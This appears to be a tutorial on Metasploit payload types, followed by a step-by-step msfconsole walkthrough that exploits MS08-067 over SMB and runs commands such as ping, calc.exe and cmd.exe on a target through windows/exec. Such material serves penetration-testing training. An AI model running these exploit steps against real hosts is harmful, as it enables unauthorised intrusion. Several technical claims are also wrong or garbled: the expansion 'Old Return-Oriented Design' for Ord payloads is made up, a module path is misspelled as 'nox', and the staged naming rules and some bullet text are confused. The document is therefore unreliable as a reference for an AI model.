Metasploit payloads are the actual code delivered to a target system after an exploit succeeds. Payloads provide access, execute commands, or establish communication back to the attacker.

## Payload Types

### Singles (Single Payloads)

- Single payloads are self-contained—everything needed is delivered in one shot.
• No external connections required.
• Good for stable, simple execution.
• Larger in size.
• Often named without/or structure (but depends on type).
• Examples:
• windows/adduser
• linux/x86/exec

### Stagers

- Stagers set up a communication channel between attacker and victim.
• Small in size.
• Useful when exploiting memory-constrained vulnerabilities.
• Prepare the environment for stages.
• Example stagers:
• windows/shell/reverse_tcp
• windows/meterpreter/reverse_http

### Stages

- Stages are the second part of a staged payload.
• Delivered after the stager.
• Provide advanced features (shell, Meterpreter, etc.).
• Depend on the communication channel created by stager.
• Examples:
• windows/meterpreter
• windows/x64/meterpreter
• linux/x86/shell

### Inline (Non-Staged) Payloads

- Inline payloads (stageless) include everything in one payload.
• No stager + stage separation.
• Larger, but more stable.
• Not detectable through staging behavior.
• Example inline payload:
• windows/meterpreter_reverse_tcp

### Staged Payloads

- Staged payloads use the format: exploit/os/payload_stage.
• Example: windows/shell/reverse_tcp.
• How they work:
• Send small stager first.
• Stager connects back.
• Stage (full payload) is transferred next.
• Useful for:
• Memory-limited exploits.
• Obfuscation.
• Network-restricted environments.

### Stageless Payloads

- Stageless payloads use: payload_os_payloadtype.
• Example: windows/shell_reverse_tcp.
• How they work:
• Entire payload sent at once.
• No extra download required.
• More stable, larger, easier to detect.

### Meterpreter Payload

- Meterpreter is an advanced, post-exploitation payload.
• Features:
• In-memory execution.
• Encrypted communication.
• Command extension modules.
• File upload/download.
• Screenshots, webcam capture, keylogging.
• Pivoting.
• Post-exploitation automation.
• Examples:
• windows/meterpreter/reverse_tcp
• windows/x64/meterpreter_reverse_https

### PassiveX Payload

- PassiveX uses Internet Explorer's ActiveX controls to bypass restrictive firewalls.
• Useful where TCP outbound connections are restricted.
• Payload runs via HTTP traffic.
• Rarely used today.

### NoNX Payloads

- Used to bypass NX/DEP protections.
• NX = No-Execute bit.
• These payloads avoid writing executable data to non-executable memory.
• Useful for older Windows targets.
• Example: windows/nox/meterpreter_reverse_tcp

### Ord Payloads

- ORD = Old Return-Oriented Design.
• Very small payloads.
• Used for limited buffer space.
• Often used with older exploits (Windows XP era).

### IPv6 Payloads

- Payloads that use IPv6 transport instead of IPv4.
• Useful when:
• Target only supports IPv6.
• Network restrictions block IPv4 channels.
• Example: windows/shell/reverse_tcp_ipv6

### Reflective DLL Injection Payloads

- These payloads use reflective DLL injection to load code directly into memory.
• No writing to disk.
• Stealthy.
• Fast.
• Main technique behind Meterpreter.
• Example: windows/x64/meterpreter/reverse_https
• Reflective loader is part of Meterpreter stage.

## Staged vs Stageless Summary

| Type | Example | Size | Network Behavior | Detection |
| --- | --- | --- | --- | --- |
| Staged | windows/shell/reverse_tcp | Small stager + large stage | Requires 2-step transfer | Harder to detect |
| Stageless | windows/shell_reverse_tcp | Large single payload | No extra transfers | Easier to detect but more stable |

## Quick Identification Rule

- Staged Payload:
• Uses: /
• Example: windows/meterpreter/reverse_tcp
• Stageless Payload:
• Uses: (no slash in payload name structure as per example)
• Example: windows/meterpreter_reverse_tcp

# windows/exec Payload

## Overview

- windows/exec is a simple, non-staged (single) payload for Windows.
• Its purpose is to execute a single command or binary on the target system after exploitation.
• No shell returned.
• No connection established.
• Only executes the command provided in CMD option.
• It is often used for:
• Running local programs (e.g., calc.exe).
• Executing commands (ping, whoami, etc.).
• Testing vulnerability success.
• Triggering another payload manually.

## Using windows/exec with MS08-067

### Load the Exploit

```
use exploit/windows/smb/ms08_067_netapi

```

### Set the Target Host

```
set RHOSTS 192.168.1.192

```

### Set the Payload

```
set PAYLOAD windows/exec

```

### Check Required Options

```
show options

```

## Examples

### Example 1: Execute a Ping Command

- To capture ICMP packets:

```
tcpdump -i eth0 icmp

```

```
set CMD 'ping 192.168.1.7'
exploit

```

### Example 2: Launch Calculator

```
set CMD calc.exe
exploit

```

### Example 3: Launch Windows CMD

- Note: This opens cmd.exe on the victim system, but does not give you a shell back. It appears only on the target's screen.

```
set CMD cmd.exe
exploit

```

## When to Use windows/exec

- Use when you want to:
• Test exploit success.
• Trigger a visible action on target (like calc.exe).
• Run commands without needing a reverse shell.
• Situations where outbound connections are blocked.
• Deliver a simple one-time command.

## Limitations

- windows/exec does not provide a session:
• No reverse shell.
• No Meterpreter.
• No remote control.
• It simply executes the command and ends.
